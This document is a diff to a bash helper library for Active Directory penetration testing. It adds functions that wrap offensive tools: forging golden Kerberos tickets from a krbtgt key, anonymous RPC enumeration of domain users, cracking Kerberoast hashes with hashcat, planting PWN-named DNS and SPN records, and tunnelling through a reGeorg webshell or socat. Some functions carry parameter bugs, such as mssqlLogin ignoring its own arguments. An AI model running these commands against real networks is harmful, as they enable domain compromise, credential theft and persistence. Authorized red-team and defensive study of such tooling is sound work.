@@ -1,7 +1,21 @@
 #!/usr/bin/env bash
 # DESCRIPTION: This script contains bash helper functions for basic pentesting tasks with local and domain PTH.
-# SECTION: Global environment variables -- top section:
+# SECTION: Global environment variables -- top section see NOTES before using:
 # DESCRIPTION: Environment variables used in helper functions -- DOMAIN, USER, PASSWORD, DCIP, C2SERVER, and IMPLANT.
+# NOTES: Make symbolic links in PATH env variable with following dependencies:
+#    git clone https://github.com/dirkjanm/adidnsdump.git /opt/
+#    git clone https://github.com/fox-it/adconnectdump.git /opt/
+#    git clone https://github.com/Hackplayers/evil-winrm.git /opt/
+#    git clone https://github.com/SecureAuthCorp/impacket.git /opt/
+#    git clone https://github.com/dirkjanm/krbrelayx.git /opt/
+#    git clone https://github.com/fox-it/mitm6.git /opt/
+#    git clone https://github.com/the-useless-one/pywerview.git /opt/
+#    git clone https://github.com/Gallopsled/pwntools.git /opt/
+#    git clone https://github.com/fox-it/BloodHound.py.git /opt/
+#    git clone https://github.com/5alt/ultrarelay.git /opt/
+#    git clone https://github.com/sensepost/ruler.git /opt/
+#    git clone https://github.com/sensepost/reGeorg.git /opt/
+#    apt-get install googlesearch;
 
 export HELPER="${PWD}/helpers.sh";
 export DOMAIN='';
@@ -46,6 +60,7 @@ function parseNameDomain(){
     printf "${DOMAIN^^}:${NAME^^}\n";
     return;
 }
+
 function parseAESHashes(){
     # DESCRIPTION: Parse AES-256 hashes from dumped secrets files.
     # ARGUMENT: parseAESHashes TARGET.
@@ -131,24 +146,6 @@ function parseNTLMHashes(){
     return;
 }
 
-function installHelper(){
-    # DESCRIPTION: Install dependencies for functions.
-    # ARGUMENT: installHelper None.
-    git clone https://github.com/dirkjanm/adidnsdump.git /opt/
-    git clone https://github.com/fox-it/adconnectdump.git /opt/
-    git clone https://github.com/Hackplayers/evil-winrm.git /opt/
-    git clone https://github.com/SecureAuthCorp/impacket.git /opt/
-    git clone https://github.com/dirkjanm/krbrelayx.git /opt/
-    git clone https://github.com/fox-it/mitm6.git /opt/
-    git clone https://github.com/the-useless-one/pywerview.git /opt/
-    git clone https://github.com/Gallopsled/pwntools.git /opt/
-    git clone https://github.com/fox-it/BloodHound.py.git /opt/
-    git clone https://github.com/5alt/ultrarelay.git /opt/
-    git clone https://github.com/sensepost/ruler.git /opt/
-    apt-get install googlesearch;
-    return;
-}
-
 function logSession(){
     # DESCRIPTION: Log bash session to file /var/LOGNAME_session_d_m_y_HM.log.
     # ARGUMENT: logSession LOGNAME.
@@ -191,6 +188,14 @@ function decryptFile(){
     -in "${FILEIN}" \
     -out "${FILEOUT}" \
     -k "${PASS}";
+    return;
+}
+
+function harvestData(){
+    # DESCRIPTION: Harvest online data for a given domain, save output to sqlite.
+    # ARGUMENT: harvestData DOMAIN.
+    DOMAIN=$1;
+    theHarvester -d ${DOMAIN} -s all -f ${DOMAIN}.xml;
     return;
 }
 
@@ -340,15 +345,26 @@ function whoisARIN(){
     return;
 }
 
-function dsNslookup(){
-    # DESCRIPTION: LDAP and Kerberos internal DNS lookup.
-    # ARGUMENT: dsNslookup TARGET, NSERVER.
+function ldapDNSLookup(){
+    # DESCRIPTION: LDAP and Kerberos DNS lookups.
+    # ARGUMENT: ldapDNSLookup TARGET, NSERVER.
     TARGET=$1;
     NSERVER=$2;
     proxychains \
     nslookup -type=srv _ldap._tcp.dc._msdcs.${TARGET} ${NSERVER};
     proxychains \
     nslookup -type=srv _kerberos._tcp.dc._msdcs.${TARGET} ${NSERVER};
+    return;
+}
+
+function dnsReconReverseIP(){
+    # DESCRIPTION: DNS recon query against target NS and domain using CIDR.
+    # ARGUMENT: dnsReconReverseIP TARGET, NSERVER, CIDR.
+    TARGET=$1;
+    NSERVER=$2;
+    CIDR=$3;
+    proxychains \
+    dnsrecon -d $TARGET -n $NSERVER -r $CIDR;
     return;
 }
 
@@ -391,7 +407,7 @@ function pingSweep(){
 }
 
 function scanSMBSettings(){
-    # DESCRIPTION: Scan target list for SMBv1 and SMBv2 security settings.
+    # DESCRIPTION: Scan target list for SMBv1 and SMBv2 security settings via IP.
     # ARGUMENT: scanSMBSettings TARGET.
     TARGET=$1;
     proxychains \
@@ -440,7 +456,7 @@ function dnsSrvEnum(){
 
 function dnsScan(){
     # DESCRIPTION: Scan target for TCP/UDP DNS services.
-    # ARGUMENT:dnsScan TARGET.
+    # ARGUMENT: dnsScan TARGET.
     TARGET=$1;
     proxychains \
     nmap -v -Pn -sT -oA "${TARGET}_dns_scan" --open -p T:53,U:53 -T 3 $TARGET;
@@ -463,11 +479,35 @@ function getInterfaces(){
     return;
 }
 
+function getRPCPWInfo(){
+    # DESCRIPTION: Dump target DC password info via RPC/DCOM information.
+    # ARGUMENT: getRPCPWInfo TARGET.
+    TARGET=$1;
+    proxychains rpcclient -U "" ${TARGET} -N -c "getdompwinfo";
+    return;
+}
+
+function getRPCUserInfo(){
+    # DESCRIPTION: Dump target DC users via RPC/DCOM information.
+    # ARGUMENT: getRPCUserInfo TARGET.
+    TARGET=$1;
+    proxychains rpcclient -U "" ${TARGET} -N -c "enumdomusers";
+    return;
+}
+
 function dumpRPC(){
     # DESCRIPTION: Dump target RPC/DCOM information.
     # ARGUMENT: dumpRPC TARGET.
     TARGET=$1;
     proxychains rpcdump.py -port 135 $TARGET;
+    return;
+}
+
+function checkRPCPrintSpool(){
+    # DESCRIPTION: Dump target print remote system MS-RPRN RPC/DCOM information.
+    # ARGUMENT: checkRPCPrintSpool TARGET.
+    TARGET=$1;
+    dumpRPC ${TARGET}|grep "MS-RPRN";
     return;
 }
 
@@ -521,10 +561,10 @@ function getSPNs(){
     TARGET=$1;
     proxychains \
     GetUserSPNs.py \
-    -target-domain $DOMAIN \
-    -request -outputfile $DOMAIN \
+    -target-domain $TARGET \
+    -outputfile $TARGET \
     -no-pass -hashes $HASHES \
-    -dc-ip $DCIP ${DOMAINUSER}@${TARGET}
+    -dc-ip $TARGET ${DOMAINUSER};
     return;
 }
 
@@ -1127,6 +1167,20 @@ function mountShare(){
     return;
 }
 
+function mssqlLogin(){
+    # DESCRIPTION: Connect to remote MSSQL database using DB login without Windows.
+    # ARGUMENT: mssqlLogin TARGET, PORT, UNAME, PASSWD.
+    TARGET=$1;
+    PORT=$2
+    UNAME=$3;
+    PASSWD=$3;
+    proxychains \
+        mssqlclient.py \
+        -port $PORT \
+        ${USER}:${PASSWORD}@${TARGET};
+    return;
+}
+
 function mssqlConnect(){
     # DESCRIPTION: Connect to remote MSSQL database.
     # ARGUMENT: mssqlConnect TARGET, DB, PORT.
@@ -1169,6 +1223,29 @@ function smbConnect(){
 }
 
 # SECTION: Server helper functions:
+
+function localHTTPTunnel(){
+    # DESCRIPTION: Forward traffic via regeorge webshell HTTP tunnel.
+    # ARGUMENT: localHTTPTunnel LHOST< LPORT, URL.
+    LHOST=$1;
+    LPORT=$2;
+    URL=$3;
+    proxychains \
+        python regeorge-v2.py -l ${LHOST} -p ${LPORT} -u ${URL};
+    return;
+}
+
+function portForward(){
+    # DESCRIPTION: Forward traffic via socat.
+    # ARGUMENT: portForward LPORT, RPORT.
+    LPORT=$1;
+    LHOST=$2;
+    RHOST=$3;
+    RPORT=$4;
+    socat TCP-LISTEN:${LPORT},bind=${LHOST},fork,reuseaddr \
+        TCP:${RHOST}:${RPORT};
+    return;
+}
 
 function localPortForward(){
     # DESCRIPTION: Spin up local port forward
@@ -1237,8 +1314,8 @@ function dumpADConnect(){
     return;
 }
 
-function dumpDCOnly(){
-    # DESCRIPTION: Dump DC hashes only using KRBCCACHE TGT.
+function dumpDCOnlyTGT(){
+    # DESCRIPTION: Dump DC hashes only using KRBCCACHE golden TGT.
     # ARGUMENT: dumpDCOnly DCFQDN.
     DCFQDN=$1;
     proxychains \
@@ -1421,6 +1498,24 @@ function addComputer(){
     return;
 }
 
+function getGoldTicket(){
+    # DESCRIPTION: Get golden TGT on target domain using krbtgt key.
+    # ARGUMENT: getGoldTicket KEY SID TDOMAIN UNAME
+    KEY=$1;
+    SID=$2;
+    TDOMAIN=$3;
+    UNAME=$4;
+    proxychains \
+        ticketer.py \
+        -debug \
+        -aesKey ${KEY} \
+        -domain-sid ${SID} \
+        -domain ${TDOMAIN} \
+        ${UNAME};
+        export KRB5CCNAME=`pwd`/${UNAME}.ccache;
+    return;
+}
+
 function getST(){
     # DESCRIPTION: Get TGT on target domain.
     # ARGUMENT: getST SPN, TARGET.
@@ -1435,115 +1530,114 @@ function getST(){
 }
 
 function addDNS(){
-    # DESCRIPTION: Add DNS on target domain  using computer or user password or hashes.
-    # ARGUMENT: addDNS IPADDRESS, SPNHOST, SERVER.
-    IPADDRESS=$1;
-    SPNHOST=$2;
-    SERVER=$3;
-    proxychains \
-    dnstool.py \
-    -u "${DOMAIN}\\${USER}" \
-    -p $PASSWORD \
-    -r "PWN-${SPNHOST}" -a add -d $IPADDRESS $SERVER;
-    return;
-}
-
-function queryDNS(){
-    # DESCRIPTION: Query DNS on target domain using computer or user password or hashes.
-    # ARGUMENT: queryDNS IPADDRESS, SPNHOST, SERVER.
-    IPADDRESS=$1;
-    SPNHOST=$2;
-    SERVER=$3;
-    proxychains \
-    dnstool.py \
-    -u "${DOMAIN}\\${USER}" \
-    -p $PASSWORD \
-    -r "PWN-${SPNHOST}" -a query -d $IPADDRESS $SERVER;
-    return;
-}
-
-function removeDNS(){
-    # DESCRIPTION: Remove DNS on target system using DOMAIN computer or user password or hashes.
-    # ARGUMENT: removeDNS IPADDRESS, SPNHOST, SERVER.
-    IPADDRESS=$1;
-    SPNHOST=$2;
-    SERVER=$3;
-    proxychains \
-    dnstool.py \
-    -u "${DOMAIN}\\${USER}" \
-    -p $PASSWORD \
-    -r "PWN-${SPNHOST}" -a remove -d $IPADDRESS $SERVER;
-    return;
-}
-
-function removeDNSExact(){
-    # DESCRIPTION: Remove exact DNS on target system using DOMAIN computer or user password or hashes.
-    # ARGUMENT: removeDNSExact IPADDRESS, SPN, SERVER.
+    # DESCRIPTION: Add DNS on target domain  using computer or user password or hashes DNS like SPN or PWN-HOST.
+    # ARGUMENT: addDNS IPADDRESS, SPN, SERVER.
     IPADDRESS=$1;
     SPN=$2;
     SERVER=$3;
     proxychains \
     dnstool.py \
     -u "${DOMAIN}\\${USER}" \
-    -p $PASSWORD \
-    -r $SPN -a remove -d $IPADDRESS $SERVER;
+    -p ${PASSWORD} \
+    -r ${SPN} -a add -d $IPADDRESS $SERVER;
     return;
 }
 
-
-function removeSPN(){
-    # DESCRIPTION: Remove SPN from target system using DOMAIN computer or user password or hashes.
-    # ARGUMENT: removeSPN SPNHOST, SERVER.
-    SPNHOST=$1;
-    SERVER=$2;
+function queryDNS(){
+    # DESCRIPTION: Query DNS on target domain using computer or user password or hashes DNS like SPN or PWN-HOST.
+    # ARGUMENT: queryDNS IPADDRESS, SPN, SERVER.
+    IPADDRESS=$1;
+    SPN=$2;
+    SERVER=$3;
     proxychains \
-    addspn.py \
+    dnstool.py \
     -u "${DOMAIN}\\${USER}" \
-    -p $PASSWORD \
-    -s "HOST/PWN-${SPNHOST}" \
-    --additional -r "ldap://${SERVER}";
+    -p ${PASSWORD} \
+    -r ${SPN} -a query -d $IPADDRESS $SERVER;
     return;
 }
 
-function removeSPNExact(){
-    # DESCRIPTION: Remove specific SPN from target system using DOMAIN computer or user password or hashes.
-    # ARGUMENT: removeSPNExact SPN, SERVER.
+function removeDNS(){
+    # DESCRIPTION: Remove DNS on target system using DOMAIN computer or user password or hashes DNS is like PWN-HOST.
+    # ARGUMENT: removeDNS IPADDRESS, SPN, SERVER.
+    IPADDRESS=$1;
+    SPN=$2;
+    SERVER=$3;
+    proxychains \
+    dnstool.py \
+    -u "${DOMAIN}\\${USER}" \
+    -p ${PASSWORD} \
+    -r ${SPN} -a remove -d $IPADDRESS $SERVER;
+    return;
+}
+
+function removeSPNDNS(){
+    # DESCRIPTION: Remove SPN via DNS from target system using DOMAIN computer or user password or hashes.
+    # ARGUMENT: removeSPN SPN, SERVER.
     SPN=$1;
     SERVER=$2;
     proxychains \
     addspn.py \
     -u "${DOMAIN}\\${USER}" \
-    -p $PASSWORD \
-    -s $SPN \
+    -p ${PASSWORD} \
+    -s ${SPN} \
     --additional -r "ldap://${SERVER}";
+    return;
+}
+
+function removeSPN(){
+    # DESCRIPTION: Remove SPN normally from target system using DOMAIN computer or user password or hashes.
+    # ARGUMENT: removeSPN SPN, SERVER.
+    SPN=$1;
+    SERVER=$2;
+    proxychains \
+    addspn.py \
+    -u "${DOMAIN}\\${USER}" \
+    -p ${PASSWORD} \
+    -s ${SPN} \
+    -r "ldap://${SERVER}";
     return;
 }
 
 function querySPN(){
     # DESCRIPTION: Query SPN on target system using DOMAIN computer or user password or hashes.
     # ARGUMENT: querySPN SPNHOST, SERVER.
-    SPNHOST=$1;
+    SPN=$1;
     SERVER=$2;
     proxychains \
     addspn.py \
     -u "${DOMAIN}\\${USER}" \
-    -p $PASSWORD \
-    -s "HOST/PWN-${SPNHOST}" \
+    -p ${PASSWORD} \
+    -s ${SPN} \
     -q "ldap://${SERVER}";
     return;
 }
 
-function addSPN(){
-    # DESCRIPTION: Add SPN on target system using computer or user password or hashes.
-    # ARGUMENT: addSPN SPNHOST, SERVER.
-    SPNHOST=$1;
+function addSPNDNS(){
+    # DESCRIPTION: Add SPN via DNS on target system using computer or user password or hashes with SPN like HOST/PWN-HOST.
+    # ARGUMENT: addSPNDNS SPN, SERVER.
+    SPN=$1;
     SERVER=$2;
     proxychains \
     addspn.py \
     -u "${DOMAIN}\\${USER}" \
-    -p $PASSWORD \
-    -s "HOST/PWN-${SPNHOST}" \
+    -p ${PASSWORD} \
+    -s ${SPN} \
     --additional "ldap://${SERVER}";
+    return;
+}
+
+function addSPN(){
+    # DESCRIPTION: Add SPN normally on target system using computer or user password or hashes with SPN like HOST/PWN-HOST.
+    # ARGUMENT: addSPN SPN, SERVER.
+    SPN=$1;
+    SERVER=$2;
+    proxychains \
+    addspn.py \
+    -u "${DOMAIN}\\${USER}" \
+    -p ${PASSWORD} \
+    -s ${SPN} \
+    "ldap://${SERVER}";
     return;
 }
 
@@ -1900,5 +1994,15 @@ function crackSPNs(){
     TARGET=$1;
     DICTIONARY=$2;
     hashcat -m 13100 -a 0 $TARGET $DICTIONARY --force
+    return;
+}
+
+function crackSPNsRules(){
+    # DESCRIPTION: Crack SPN hashes with rules.
+    # ARGUMENT: crackSPNs TARGET, DICTIONARY, RULES.
+    TARGET=$1;
+    DICTIONARY=$2;
+    RULES=$3;
+    hashcat -m 13100 -a 0 $TARGET $DICTIONARY --rules-file $RULES --force
     return;
 }
